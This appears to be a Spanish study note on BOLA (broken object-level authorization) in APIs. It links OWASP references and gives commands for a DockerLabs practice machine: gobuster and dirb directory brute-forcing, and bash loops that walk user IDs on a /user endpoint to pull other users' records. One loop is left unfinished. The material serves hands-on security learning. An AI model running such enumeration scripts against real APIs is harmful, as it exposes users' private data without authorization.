- Tags : #api #bola #recursos_dockerlabs 

BOLA : [https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)

Authorization Cheat Sheet en APIs
https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html

 Authorization Testing Automation Cheat Sheet APIs
 [https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html)

**Recurso**: Maquina BOLA dockerlabs.es

```bash
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://172.17.0.2:12345 2>/dev/null

dirb http://172.17.0.2:12345/
```

```bash
#!/bin/bash

URL="http://172.17.0.2:12345/user"

for id in {1..50}; do
	curl "$URL/$id"
	echo -e "\n\n------------------------" 
```

Version mejor
```bash
#!/bin/bash

URL="http://172.17.0.2:12345/user"

for id in {1..50}; do
    response=$(curl -s -w "HTTPSTATUS:%{http_code}" "$URL/$id")

    body=$(echo "$response" | sed -e 's/HTTPSTATUS\:.*//g')
    status=$(echo "$response" | tr -d '\n' | sed -e 's/.*HTTPSTATUS://')

    if [ "$status" = "200" ]; then
        echo "[+] ID válido: $id"
        echo "$body"
        echo "----------------------"
    fi
done

```